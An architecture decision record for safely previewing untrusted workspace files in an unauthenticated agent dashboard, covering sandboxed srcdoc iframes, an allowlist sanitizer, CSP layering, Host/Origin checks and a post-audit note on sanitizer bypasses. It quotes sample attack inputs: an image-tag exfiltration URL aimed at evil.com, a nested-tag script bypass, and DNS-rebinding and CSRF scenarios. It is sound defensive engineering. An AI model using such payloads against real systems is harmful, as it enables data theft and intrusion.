# ADR-0011 — Rendering untrusted workspace content: inline-and-sandbox, and the dashboard-origin trust boundary

- Status: **Accepted** (2026-07-30 — implemented, reviewed, security-audited, fixed, and re-verified on `ad/workflow-templates`). Decisions D1–D3 held under adversarial audit; see the post-audit note at the end, which records the one architectural lesson that changed how the layering should be understood.
- Date: 2026-07-30
- Deciders: Avadhoot Divekar (user), Claude (architect role)
- Related: **ADR-0010** (dashboard architecture — D7 records the no-auth posture this ADR is forced to design around) · **ADR-0009** (benchmark tiers — the mechanism that imports third-party repos into the workspace) · design [`dashboard-file-preview-hld.md`](../dashboard-file-preview-hld.md) · [`meta/ROADMAP.md`](../../meta/ROADMAP.md) §3.1

## Context

The dashboard's file viewer shows plain monospace text and nothing else. The ask was a real
viewer: markdown rendered, code highlighted, images displayed, HTML and SVG previewed,
typography adjustable.

Rendering is the feature. But three facts about this system, each already true before this
epic, make rendering the dangerous part:

1. **The workspace is where agents write files.** Agents act on prompts we do not fully
   control, paste from the network, and — via the benchmark tiers (ADR-0009) — **import
   third-party repositories into the workspace wholesale**. A workspace `.html`, `.svg`, or
   `.md` is bytes of unreviewed provenance, not "the user's own file."
2. **The dashboard origin is a privileged origin.** Per ADR-0010 D7 there is no
   authentication. Anything executing in that origin can read every file under every
   configured root and can `POST /api/runs` — which launches agents against the workspace.
   That single endpoint is **arbitrary code execution and unbounded token spend**.
3. **Egress needs no JavaScript.** `<img src="https://evil.com/?data=…">`, a CSS
   `background: url(…)`, an `@font-face`, a `meta refresh`, an `@import` — all fire without
   script, several with zero interaction. And because the request comes from the user's
   browser it reaches hosts an external attacker cannot: loopback, the LAN, cloud metadata.

So the design question was never "which markdown library." It was: **how do you display
attacker-controlled markup inside an unauthenticated origin that holds an RCE primitive?**

Two decisions answer that, and a third records the trust boundary they rest on.

---

## D1 — Preview by server-side sanitize + asset inlining into a `srcdoc` sandbox, NOT a raw-bytes proxy endpoint

**Decision.** `GET /api/files/html` returns a **sanitized, self-contained** HTML string: an
allowlist re-serialization of the source document in which every in-root asset reference has
been read from disk and inlined as a `data:` URI, and every other reference has been dropped
and reported. The client renders that string into `<iframe sandbox="" srcDoc={…}>`. There is
**no endpoint that serves raw workspace bytes.**

**The rejected alternative** was the obvious one: add `GET /api/files/raw?path=`, point the
iframe's `src` at it, and let relative refs resolve naturally as further requests to the same
endpoint. Nearly no sanitizer needed; relative paths, stylesheets, and fonts all just work.

**Why rejected — it re-creates the egress channel the whole design exists to close.** Once
framed content can issue requests the browser resolves, every relative ref is a live request.
Serving those from *our* origin is worse than an external fetch, not better: the content is
now making authenticated-by-locality requests against the privileged API surface. Per-request
path containment bounds *which files* leak; it does nothing about the channel itself —
request presence, request timing, and data encoded into the path.

**Why rejected — it puts a permanent raw-bytes primitive on the attack surface.**
`/api/files/raw` would be a general "serve any workspace file with a content type" endpoint,
reachable by anything that reaches the origin, forever — long outliving the UI change that
motivated it. Its safety would then rest on getting `Content-Type` right for every file type,
plus `nosniff`, plus `Content-Disposition`, plus nobody upstream ever relaxing a sandbox
attribute. That is a standing correctness debt in exchange for a convenience.

**Why `srcdoc` is strictly easier to reason about.** `srcdoc` with `sandbox=""` yields an
opaque origin and **no base URL**, so a relative reference has nothing to resolve *against*.
The absence of a resolution target is a structural guarantee rather than a check that can be
bypassed. The security claim reduces to one auditable sentence: *the only bytes in the frame
are bytes the server chose to put there, and the only URL scheme present is `data:`.*

**Consequence — a size budget, and we accept it.** Everything must fit:
`HTML_INLINE_BUDGET_BYTES = 10_000_000` total, `HTML_ASSET_MAX_BYTES = 5_000_000` per asset,
`HTML_MAX_IMPORT_DEPTH = 3`, source bounded by the existing `MAX_READ_BYTES`. Asset-heavy
documents will preview **incompletely**, and base64 inflates responses ~1.37×.

Three things make that tolerable:
- **Omissions are visible, never silent.** Every dropped reference is reported with a reason
  (`external`, `outside-root`, `not-found`, `too-large`, `budget-exhausted`,
  `unsupported-scheme`, `depth-exceeded`) and surfaced above the frame. The user asked for
  containment; they can see what was contained. A proxy design would drop things invisibly
  in the browser's network layer.
- **Budgets are never spent partially.** Exceeding a cap drops the reference whole. A
  half-written PNG renders as a corrupt image, which reads as a dashboard bug rather than a
  deliberate omission.
- **If the budget is too tight, raise the constants** — they are named and in one place
  precisely so. The fix is never to add a raw endpoint, which would trade a quantitative
  limit for a qualitative loss of the egress guarantee.

**Consequence — the sanitizer must parse, not regex.** Stdlib `html.parser.HTMLParser` with
an allowlist re-serializer, no new dependency. Regex tag-stripping is defeated by nested-tag
reassembly (`<scr<script>ipt>`), malformed attributes, and comment tricks. An allowlist
serializer is safe by construction: an element or attribute we did not explicitly decide to
emit cannot appear. Being wrong about a blocklist costs a compromise; being wrong about an
allowlist costs a missing tag.

**Consequence — escaping on re-serialize is part of the decision, not an implementation
detail.** All text and attribute values pass through `html.escape(..., quote=True)`, with
attribute values always double-quoted. A sanitizer can be perfect about *which* nodes it
keeps and still reintroduce live markup by writing a kept node's text back out raw — the
exact bug class already recorded in [`meta/learnings.md`](../../meta/learnings.md) under
"template render escaping/containment."

**Consequence — one path guard, reused.** The inliner resolves refs against the HTML file's
own directory and then hands them to **`FileBrowser.resolve`'s existing guard** —
`Path.resolve()` (which collapses `..` *and* follows symlinks) then prefix-check the resolved
path. Two path guards means two chances to be wrong with no guarantee they agree, and a fix
to one silently leaves the other exploitable. The same reasoning makes the frontend resolve
markdown image refs by *calling the API* rather than growing a third resolver in TypeScript.

**Consequence — SVG is markup, never an image.** SVG looks like an image and is an XML
document that can carry `<script>`, `<foreignObject>`, `on*` handlers, and `<use
xlink:href>`. Classifying it as an image would put it on the inline-into-`<img>` path and,
worse, invite inlining it into the page DOM. It is classified `markup` and goes through the
full sanitize-and-sandbox pipeline, exactly like a hostile HTML file.

---

## D2 — The security boundary is an opaque origin; sanitization is the second layer, and the two sandbox flags that defeat it are called out in code

**Decision.** The iframe is `sandbox=""` — no `allow-scripts`, and **never**
`allow-same-origin`. Omitting `allow-same-origin` gives the frame an **opaque origin**: it is
same-origin with nothing, including itself. That, not the sanitizer, is the boundary.

**Why the boundary cannot be the sanitizer.** Sanitizers have bugs, and browser HTML parsing
has quirks that a hand-written serializer will not model perfectly. If sanitization were the
only guard, one parsing edge case would be a full workspace compromise (Context §2). With the
opaque origin in place, a sanitizer miss is a **rendering bug** — the surviving script has no
origin privileges, no cookie access, and no same-origin `fetch` to `/api/runs`. Inverting
this — treating the sandbox as the belt and the sanitizer as the braces — is what makes the
residual risk of a hand-written sanitizer acceptable.

The layering is therefore explicit and ordered:

| Layer | Mechanism | Fails how |
|---|---|---|
| 1 (boundary) | `sandbox=""` → opaque origin, scripts disabled | Browser primitive; would require a browser bug |
| 2 | Server-side allowlist sanitizer + `data:`-only URL pipeline | Hand-written; assume bugs exist |
| 3 | Frame `<meta http-equiv="Content-Security-Policy">` — `default-src 'none'; img-src data:; script-src 'none'; connect-src 'none'; …` | Costs one tag |
| 4 | SPA-document CSP — `connect-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'none'; form-action 'none'` | Catches a markdown-sanitizer bypass in the app origin |

**Server-side sanitization is nonetheless authoritative.** The client's DOMPurify pass and
the `sandbox` attribute are defence in depth. If either were the *only* guard, a frontend
build bug, a stale cached bundle, or a future refactor rendering server HTML through a
different path would be a compromise. **The server never emits markup it would be unsafe to
render.**

**The `allow-scripts` + `allow-same-origin` trap gets a code comment, and that comment is a
deliverable.** Those two flags **together defeat the sandbox entirely**: framed content runs
script in the parent's origin and can reach up and delete the `sandbox` attribute from its
own iframe element. Each flag reads like a modest, safe-sounding relaxation. The realistic
regression path is mundane — someone previews an HTML file with interactive charts, the
charts do not work, they add `allow-scripts`; something else does not work, they add
`allow-same-origin` because it sounds like a scoping fix. Neither diff looks alarming in
review.

So the mitigation is documentation *at the call site* plus a test asserting neither flag is
present by default. An optional per-file "enable scripts" toggle is permitted only as
`sandbox="allow-scripts"` (still no `allow-same-origin`), off by default, reset on file
change — and **omitted entirely if the implementer is not confident**, because a half-safe
version advertises safety it does not have.

**Consequence — content classification decides the render path, and untrusted markup does
not auto-render.** `kind` (`text` | `image` | `markup` | `binary`) selects the viewer.
`markup` defaults to the **Source** tab: the sandbox makes preview safe, and defaulting to
Source makes it *chosen* rather than a side effect of clicking a filename in a tree. Markdown
defaults to Preview — that is what markdown is for, and it passes through DOMPurify with an
explicit allowlist and a `ALLOWED_URI_REGEXP` limited to `http`/`https`/`mailto`/relative
either way.

**Consequence — image classification requires two independent signals to agree.** `image`
requires an allowlisted extension **and** confirming magic bytes, so a `.png` containing HTML
is not treated as an image. The emitted MIME comes from the **extension allowlist only** —
never from content sniffing (attacker-controlled input), never echoed from a request
parameter — with `X-Content-Type-Options: nosniff` on every response as the backstop.
Sniffing decides *whether* something is an image; the allowlist decides *what MIME we
declare*. Neither input alone controls the outcome.

**Consequence — every ingestion path has a named cap.** Untrusted input meets a regex-based
highlighter, so `HIGHLIGHT_MAX_BYTES = 256_000` bounds highlighting (beyond it, plain text
with a note) — a hard byte bound rather than reasoning about any grammar's worst case.
Similarly `MARKDOWN_MAX_IMAGES = 50`, `IMAGE_INLINE_MAX_BYTES = 5_000_000`, and the existing
`MAX_READ_BYTES`. A hung browser tab is a denial of service on the operator's only window
into their runs.

---

## D3 — The dashboard origin is a trust boundary that must be defended at the transport layer, not only at the render layer

**Decision.** New `ui/security.py` middleware, added in `create_app`, enforces a `Host`
allowlist (**421 Misdirected Request**), an `Origin` check on mutating methods (**403**), a
required `Content-Type: application/json` on mutating routes (**415**), hardening response
headers on every response, and a CSP on the SPA document.

**Why this is in this ADR at all.** It closes a **pre-existing critical gap** unrelated to
file preview: today the dashboard validates neither `Origin` nor `Host`. It belongs here
because D1 and D2 rest on a premise — "content that does not reach the dashboard origin
cannot hurt us" — that is only true if the origin is actually defensible. Two attacks reach
it without any file preview involved:

- **CSRF.** Any site the user visits while `ao ui` runs can `POST /api/runs` with a plain
  HTML form. No same-origin read is needed; firing the request blind is enough, because that
  endpoint is RCE and spend. **Loopback binding does not help — the browser is on loopback.**
- **DNS rebinding.** A page on `attacker.com` with a 1-second-TTL record that rebinds to
  `127.0.0.1`. The browser then treats `http://attacker.com:8765/` as genuinely same-origin
  with the attacker's page, so the same-origin policy, CORS, *and* an `Origin` check all pass
  legitimately. Full read and write.

**Why each control, and what specifically it stops:**

| Control | Stops | Note |
|---|---|---|
| `Host` allowlist → 421 | **DNS rebinding** | The rebound request still carries `Host: attacker.com`. This is the control that matters — an `Origin` check alone does not stop rebinding, because after rebinding the origin genuinely matches. Default allowlist: `localhost`, `127.0.0.1`, `[::1]`, `::1` (any port) plus the host `ao ui` bound to; `AO_UI_ALLOWED_HOSTS` configures it; a literal `*` disables it with a loud startup warning |
| `Origin` on mutating methods → 403 | Classic cross-site CSRF | **Absent `Origin` is allowed** — curl, the CLI, and the test client are legitimate non-browser callers, and browsers always send `Origin` on cross-origin mutating requests, so CSRF stays blocked without breaking scripted use |
| `Content-Type: application/json` required → 415 | `<form>`-based CSRF specifically | An HTML form can only send `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`; it **cannot** set `application/json` |
| `nosniff`, `Referrer-Policy: no-referrer`, `COOP: same-origin`, `CORP: same-origin` | MIME sniffing; workspace paths leaking via `Referer`; cross-origin `window.opener` reach-in; cross-origin inclusion of API responses | Every response |
| SPA-document CSP | Whole-app fallback if markdown sanitization is bypassed | JSON responses excluded |

The `Origin` and `Content-Type` controls are **deliberately redundant**: each covers a case
the other does not, and together they cover browser-initiated mutation without breaking
non-browser clients.

**Consequence — the SPA CSP had to be verified empirically, not derived from the spec.
DONE; the drafted policy shipped unchanged.** The unknown was whether a sandboxed `srcdoc`
iframe with inlined `data:` images renders under it — `srcdoc` CSP inheritance and
`frame-src`/`img-src` interaction are areas where browsers have historically differed from a
plain spec reading.

Verified in **real headless Chrome**, twice independently (the SPA document policy and the
frame `<meta>` policy), each with a **negative control**: removing `data:` from `img-src` made
the same sampled pixel come back as page background instead of the test image's red. The
negative control is what makes this evidence rather than a demo — it proves the policy
*discriminates* instead of being permissive-by-accident, which a passing-only check cannot
distinguish. Method and scope limits: HLD §4.3. The narratives live at the constants
(`security.py::SPA_CSP`, `HtmlPreview.tsx::PREVIEW_CSP`) so they cannot drift from the values
they justify.

**And the limit this verification does not reach — which turned out to matter.** It
establishes that the policies permit what the feature needs and forbid the subresource classes
they name. It says nothing about **navigation**, because no CSP directive governs navigation.
That gap is exactly what finding H1 exploited (post-audit note below).

**Consequence — a test fixture must not become the way the control is disabled.** Starlette's
`TestClient` sends `Host: testserver`, which the allowlist rejects. The accommodation lives
in **one** place (`tests/ui/conftest.py`) and is paired with explicit tests asserting that the
check still rejects bad hosts. A security control that every test opts out of is not a
control.

**Consequence — this narrows the ways content reaches the origin; it does not add
authentication.** ADR-0010 D7 stands unchanged: anything that reaches the origin still has
full access. Authentication remains the top roadmap item
([`meta/ROADMAP.md`](../../meta/ROADMAP.md) §3.1), and nothing here should be read as a
durable multi-user security posture.

---

## Alternatives considered

| Alternative | Why rejected |
|---|---|
| `GET /api/files/raw` + iframe `src` (proxy preview) | Re-creates a live egress channel from framed content into the privileged origin, and leaves a permanent raw-bytes primitive on the attack surface (D1). |
| Render previewed HTML directly into the page DOM (`dangerouslySetInnerHTML`) | Any sanitizer miss becomes RCE + spend via `POST /api/runs`. The opaque origin exists precisely so a sanitizer bug is a rendering bug (D2). |
| `sandbox="allow-scripts allow-same-origin"` so previews stay interactive | The two flags together defeat the sandbox entirely — framed content runs in our origin and can strip the attribute (D2). |
| Regex-strip dangerous tags instead of parsing | Trivially bypassed by nested-tag reassembly, malformed attributes, and comment tricks (D1). |
| Add a dependency (`bleach`/`nh3`/`lxml`) for sanitization | Core install stays lean and the `[ui]` extra stays small; stdlib `HTMLParser` plus an allowlist serializer is sufficient, and *writing* the allowlist is the part that carries the security reasoning anyway. Revisitable if the hand-written serializer proves fragile. |
| Allowlist trusted external hosts for assets | Breaks the no-egress invariant. Any permitted outbound request is an exfiltration channel and a browser-side SSRF vector. |
| Fetch external refs server-side and inline the results | Turns the dashboard process into an SSRF client with a long-lived server-side identity — strictly worse than the browser doing it. |
| Classify SVG as an image | SVG is an XML document that can carry script; treating it as an image routes it around the sanitize pipeline (D1). |
| Derive image MIME from content sniffing | The attacker controls the sniff input and can steer it toward `text/html` (D2). |
| Trust the client's DOMPurify pass as the sanitization layer | A build bug, a stale bundle, or a refactor that renders server HTML elsewhere would be a compromise. Server-side sanitization is authoritative (D2). |
| Rely on loopback binding against CSRF | The browser making the request is itself on loopback (D3). |
| `Origin` checking alone, without a `Host` allowlist | After DNS rebinding the origin legitimately matches; only the `Host` check catches it (D3). |
| No highlighting byte cap ("files are small in practice") | Workspace files are untrusted; a regex highlighter on adversarial input hangs the operator's only view of their runs (D2). |

---

## Post-audit note (2026-07-30) — the layering is load-bearing, not belt-and-braces

An adversarial security audit ran against the shipped implementation — real browser, real
captured network requests, execution-confirmed rather than diff-reading. It found one High
(H1: SVG SMIL animation retargeting `href` at render time, defeating the sanitizer's own
`href` stripping) and one Medium (M1: CSS `image-set()` bypassing the URL pipeline), plus four
Low. All are fixed and re-verified; the findings and evidence are catalogued in HLD §10.

D1, D2, and D3 all survived. But the audit changes how **D2's layering** should be understood,
and that correction is the reason this note exists.

### The lesson

**D2 presented the layering as belt-and-braces. It is not — it is load-bearing, and it is the
only reason two real findings were not serious.**

- **M1 was neutralized entirely by layer 3.** The frame CSP's `img-src data:` blocked the
  `image-set()` load, so a genuine sanitizer bypass was **never exploitable in shipped form**.
- **H1 was contained entirely by layer 1.** The malicious self-navigation was confined to the
  iframe — the top frame never moved (verified) — so a live egress channel was **not** a
  sandbox escape, **not** an origin compromise, no workspace read, no `POST /api/runs`, no
  spend.

Neither containment was luck, and neither came from the sanitizer. Each came from a layer built
as an **independent** control rather than as reinforcement of the one below it. Had the design
followed the tempting path — "the sanitizer is thorough, so the sandbox and CSP are
formalities" — M1 would have been a live exfiltration channel and H1 would have been far worse.

### Why layer 2 will keep having gaps, and why that is survivable but not acceptable

The implementation shipped an element/attribute policy that is a **blocklist plus special
cases**, not the keep-only allowlist D1 called for. The difference is directional:

> An **allowlist** fails toward a missing tag. A **blocklist** fails toward a live one.

H1 and M1 are that difference, realized: `<animate>` and `image-set()` were both simply *not on
a list*. More will be found, because a blocklist is a standing bet that the dangerous set was
fully enumerated — against a substrate (HTML, SVG, CSS) that gains features continuously.

So: **the layering makes a blocklist survivable; it does not make it correct.** Converting to a
true keep-only allowlist is the highest-value follow-up (HLD §9.2). It is deferrable
specifically *because* layers 1 and 3 demonstrably catch layer-2 misses — which is a reason to
keep the layers intact, not a reason to relax about the sanitizer.

### The one gap no layer covers: navigation

**CSP cannot mitigate navigation. The sandbox does not either, for self-navigation.**

- `sandbox=""` restricts navigating *other* browsing contexts. A framed document navigating
  **itself** is not sandboxable and never has been.
- **No CSP directive governs navigation.** `connect-src`/`img-src` govern subresource fetches;
  `form-action` covers form submission; `frame-src` governs what may be *embedded*, not where
  an embedded document may *go*. There is no directive to reach for.
- The opaque origin makes such a navigation harmless *to the dashboard* while doing nothing to
  stop the request leaving.

**This is why H1 passed through all three layers and had to be fixed in the sanitizer.** It is
the one attack class where the stack is silent and the sanitizer is the sole control — the
inverse of this ADR's normal posture, and worth knowing before someone reasons "the sandbox
handles it."

**A false premise is more dangerous than an acknowledged unknown.** The prior HLD justified
`<a href>` stripping with "the sandbox blocks navigation anyway." That was never true, and
because it was written as settled fact rather than as an open question, nothing prompted anyone
to check it — so the class of attack it dismissed went unexamined until an audit fired a real
payload. The unverified-CSP question, by contrast, was *flagged* as open and consequently got
verified with controls. **The dangerous items are the ones nobody thought to list.** The
corrected reasoning is in HLD §2.2.1 and mirrored at the `htmlpreview.py` call site so the
justification travels with the code.

### What did not change

D1 (inline + sandbox over a raw-bytes proxy), D2's core ordering (opaque origin as the
boundary, sanitizer second), and D3 (transport-layer defence of the origin) all stand. The
audit also *failed* to break several deliberate choices, which is evidence for them: parse-
don't-regex defeated `<scr<script>ipt>` for the same tokenizer reason real browsers do;
percent-decode-once resisted double-encoded traversal; excluding `data:image/svg+xml` from the
inline allowlist held; and browsers proved unable to construct a bodyless cross-origin
state-changing request without an `Origin` header, which is what makes D3's Content-Type
bodyless exemption a safe scoping decision rather than a bypass (HLD §10.4).
